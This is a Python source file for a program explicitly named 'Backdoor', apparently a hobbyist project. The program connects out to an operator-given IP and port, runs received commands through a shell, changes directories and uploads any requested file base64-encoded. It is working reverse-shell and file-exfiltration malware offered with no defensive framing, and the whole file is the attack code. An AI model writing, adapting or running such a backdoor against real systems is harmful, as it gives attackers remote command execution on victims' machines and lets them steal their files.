import subprocess, sys, socket, json, argparse, os, base64, traceback, time


class Args:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address.')
        parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port.')     
        parser.set_defaults(port = 1337)
        options = parser.parse_args()
        self.ip = options.ip
        self.port = options.port


class Backdoor:
    
    
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.connection.connect((str(ip),int(port)))
        except ConnectionRefusedError:
            sys.exit()
        
    
    def cd(self,path):
        try:
            print('path:',path)
            fullPath = path[1:] # path will be everything following cd command
            print('fullPath:',fullPath)
            fullPathJoin = ' '.join(fullPath)
            print('fullPathJoin:',fullPathJoin)
            os.chdir(str(fullPathJoin))
            print(os.curdir)
            return f"Changing directory\n>>\"{str(fullPathJoin)}\"\nCurrent Directory:\n{str(os.path.abspath(os.curdir))}"
        except PermissionError:
            self.sendStream('PermissionError, change directory command not accepted by target')
        except FileNotFoundError:
            self.sendStream('FileNotFoundError, change directory command not accepted by target')
        except OSError:
            self.sendStream('OSError, change directory command not accepted by target')
            
    
    def executeCmd(self,cmd):
        try:
            cmd = subprocess.check_output(cmd,shell=True)
            return cmd
        except subprocess.CalledProcessError as e:
            return str(e)
    
    
    def sendStream(self,data):
        #print(f'sendStream data type: {type(data)}')
        if isinstance(data,str):

            jsData = json.dumps(data)
            #print(jsData)
            self.connection.send(str(jsData).encode('utf-8'))
        elif isinstance(data,dict): #using this for download function
            print(type(data))
            print(type(data['data']))
            print(data['data'])
            if isinstance(data['data'],bytes):
                data['data'] = data['data'].decode()
            print(type(data))
            print(type(data['data']))
            print(data['data'])
            
            #data = data['data'] #value of data
            #print(f'sendStream dict data: {data}')
            #print(type(data['data']))
            
            jsData = json.dumps(data)
            #print(jsData)
            self.connection.send(str(jsData).encode('utf-8'))

        

        # print(f'sendStream data type: {type(data)}')

        # if isinstance(data,bytes):
        #     data = data.decode()

        # jsData = json.dumps(data)
        # print(f'sendStream jsData type:{type(jsData)}')
        # self.connection.send(jsData)
        # #self.connection.send(str(jsData).encode('utf-8'))
        

        


    def recvStream(self):
        time.sleep(1)
        jsData = ''
        while True:
            try:
                recvData = self.connection.recv(1024)
                recvData = recvData.decode() 
                jsData = jsData + recvData
                return json.loads(jsData)
            except Exception as e:
                continue

    def read_file(self,file):
        data = {}
        print('start of read_file basic')
        try:
            with open(file,'rb') as read_file:
                value = read_file.read()
            print(value)
            value = base64.b64encode(value)
            print(value,':',type(value))
            data['data'] = value
            print(data)
            return data #dictionary for download 
        except FileNotFoundError:
            return 'FileNotFoundError'
        
    
    def readFile(self,file):
        
        #defaultData = {'data':'Could not read file'}
        noExt = {'data':'No file extension, Download not performed'}
        print('Start of readFile Method')
        charFiles = ['txt','py','docx','doc'] # add to this 
        picFile = ['png','jpeg','jpg']
        try:
            fileType = file.split('.')[1]
        except:
            return noExt
        print(f'File type: {fileType}')
        try:
            #fileType = self.cmdIn[1].split('.')[1]

            if fileType in charFiles:  
                data = {}
                with open(file,'rb') as readFile:
                    value = readFile.read()
                data['data'] = value.decode()
                return data
            
            elif fileType in picFile:
                data = {}
                with open(file, mode='rb') as readFile:
                    value = readFile.read()
                data['data'] = base64.encodebytes(value).decode('utf-8')
                picData = data['data']
                print(f'dict data type: {type(picData)}')
                #print(data['data'])
                print('json dict')
                #print(json.dumps(data))
                return data
            else:
                data = {}
                with open(file,'rb') as readFile:
                    value = readFile.read()
                print(type(value))
                try:

                    print('Misc file read try')
                    print(value[1:20])
                    data['data'] = value.decode()
                except:

                    print('Misc file read except')
                    #print(value[1:20])
                    print(traceback.format_exc())
                    data['data'] = base64.encodebytes(value).decode('utf-8')
                    content = data['data']
                    print(content[1:20])
                return data
                  
            
        
        except FileNotFoundError:
            print('file not found')
            return 'FileNotFoundError'
        except IndexError:
            return 'IndexError'

    
    def run(self):
        while True:
            print('run1')
            self.cmdIn = self.recvStream()
            print(self.cmdIn)
            print('run2')
            
            if self.cmdIn[0] == 'bye':
                print('bye')
                self.connection.close()
                exit()
            
            elif self.cmdIn[0] == 'cd' and len(self.cmdIn) > 1:  #meaning cmdIn = ['cd','c:\\'] is len() = 2
                print('trying CD') 
                cmdOut = self.cd(self.cmdIn) 
                self.sendStream(cmdOut)
            
            elif self.cmdIn[0] == 'download': #download function starting using read_file currently
                
                print('Trying download')
                print(f'file cmd received: {self.cmdIn[1]}')
                cmdOut = self.read_file(self.cmdIn[1]) # cmdIn[1] is the file test.txt, text.png, etc
                print(f'readFile method complete')
                print(type(cmdOut))
                print(f'sending data: {cmdOut}')
                self.sendStream(cmdOut)
            
            else:   
                print('Try3')
                print('run3_PRE_TRY')
                cmdOut = self.executeCmd(self.cmdIn)  
                print(f'{cmdOut[1:20]},{type(cmdOut)}')
                print('run4_POST_TRY')
                if isinstance(cmdOut,bytes):
                    cmdOut = cmdOut.decode('utf-8')
                #print(cmdOut)
                print(type(cmdOut))
                self.sendStream(cmdOut)
                   

try:
    args = Args()
    backdoor = Backdoor(args.ip,args.port)
    backdoor.run()
except KeyboardInterrupt:
    sys.exit()
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()


